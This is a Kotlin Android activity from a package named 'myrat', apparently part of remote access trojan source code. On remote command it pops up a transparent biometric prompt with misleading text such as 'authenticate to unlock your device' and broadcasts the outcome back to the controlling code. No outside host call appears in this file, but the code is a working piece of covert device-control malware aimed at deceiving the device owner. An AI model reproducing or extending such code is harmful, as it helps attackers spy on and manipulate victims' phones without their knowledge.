package com.myrat.app

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.biometric.BiometricManager
import androidx.biometric.BiometricPrompt as BiometricPromptCompat
import androidx.core.content.ContextCompat
import com.myrat.app.utils.Logger
import java.util.concurrent.Executor

class BiometricAuthActivity : AppCompatActivity() {

    companion object {
        const val EXTRA_COMMAND_ID = "extra_command_id"
        const val EXTRA_ACTION = "extra_action"
        const val ACTION_BIOMETRIC_RESULT = "com.myrat.app.BIOMETRIC_RESULT"
        const val EXTRA_RESULT = "extra_result"
        const val EXTRA_ERROR = "extra_error"

        const val ACTION_CAPTURE_BIOMETRIC = "CaptureBiometricData"
        const val ACTION_BIOMETRIC_UNLOCK = "BiometricUnlock"

        const val RESULT_SUCCESS = "success"
        const val RESULT_FAILED = "failed"
        const val RESULT_CANCELLED = "cancelled"
    }

    private lateinit var executor: Executor

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // No setContentView; using dialog theme
        window.setBackgroundDrawableResource(android.R.color.transparent)

        executor = ContextCompat.getMainExecutor(this)

        val commandId = intent.getStringExtra(EXTRA_COMMAND_ID) ?: "unknown_${System.currentTimeMillis()}"
        val action = intent.getStringExtra(EXTRA_ACTION) ?: "unknown"

        if (commandId.startsWith("unknown") || action == "unknown") {
            Logger.error("BiometricAuthActivity started with missing extras: commandId=$commandId, action=$action")
            sendResult(commandId, RESULT_FAILED, "Missing commandId or action", action)
            finish()
            return
        }

        if (!hasBiometricPermission()) {
            Logger.error("Biometric permission not granted: commandId=$commandId, action=$action")
            sendResult(commandId, RESULT_FAILED, "Biometric permission not granted", action)
            finish()
            return
        }

        val biometricManager = BiometricManager.from(this)
        val authResult = biometricManager.canAuthenticate(BiometricManager.Authenticators.BIOMETRIC_STRONG)
        Logger.log("Biometric status for commandId=$commandId: $authResult")
        if (authResult != BiometricManager.BIOMETRIC_SUCCESS) {
            Logger.error("Biometric authentication not available: commandId=$commandId, action=$action")
            sendResult(commandId, RESULT_FAILED, "Biometric authentication not available or enrolled", action)
            finish()
            return
        }

        when (action) {
            ACTION_CAPTURE_BIOMETRIC -> showBiometricPrompt(commandId, "Capture Biometric Data", "Please authenticate to capture your biometric data", action)
            ACTION_BIOMETRIC_UNLOCK -> showBiometricPrompt(commandId, "Biometric Unlock", "Please authenticate to unlock your device", action)
            else -> {
                Logger.error("Unknown biometric action: $action, commandId=$commandId")
                sendResult(commandId, RESULT_FAILED, "Unknown action: $action", action)
                finish()
            }
        }
    }

    private fun showBiometricPrompt(commandId: String, title: String, description: String, action: String) {
        try {
            val biometricPrompt = BiometricPromptCompat(this, executor, object : BiometricPromptCompat.AuthenticationCallback() {
                override fun onAuthenticationError(errorCode: Int, errString: CharSequence) {
                    Logger.error("Biometric prompt error: $errString, commandId=$commandId")
                    sendResult(commandId, RESULT_FAILED, "Biometric error: $errString", action)
                    finish()
                }

                override fun onAuthenticationSucceeded(result: BiometricPromptCompat.AuthenticationResult) {
                    Logger.log("Biometric prompt succeeded: commandId=$commandId")
                    sendResult(commandId, RESULT_SUCCESS, null, action)
                    finish()
                }

                override fun onAuthenticationFailed() {
                    Logger.error("Biometric prompt failed: commandId=$commandId")
                    sendResult(commandId, RESULT_FAILED, "Biometric authentication failed", action)
                    finish()
                }
            })

            val promptInfo = BiometricPromptCompat.PromptInfo.Builder()
                .setTitle(title)
                .setDescription(description)
                .setNegativeButtonText("Cancel")
                .build()

            biometricPrompt.authenticate(promptInfo)
        } catch (e: Exception) {
            Logger.error("Failed to show biometric prompt: commandId=$commandId", e)
            sendResult(commandId, RESULT_FAILED, "Failed to show biometric prompt: ${e.message}", action)
            finish()
        }
    }

    private fun sendResult(commandId: String, result: String, error: String?, action: String) {
        try {
            val intent = Intent(ACTION_BIOMETRIC_RESULT).apply {
                putExtra(EXTRA_COMMAND_ID, commandId)
                putExtra(EXTRA_RESULT, result)
                putExtra(EXTRA_ACTION, action)
                error?.let { putExtra(EXTRA_ERROR, it) }
            }
            sendBroadcast(intent)
            Logger.log("Broadcast sent for commandId: $commandId, result: $result")
        } catch (e: Exception) {
            Logger.error("Failed to send broadcast for commandId: $commandId", e)
        }
    }

    private fun hasBiometricPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.USE_BIOMETRIC) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
    }
}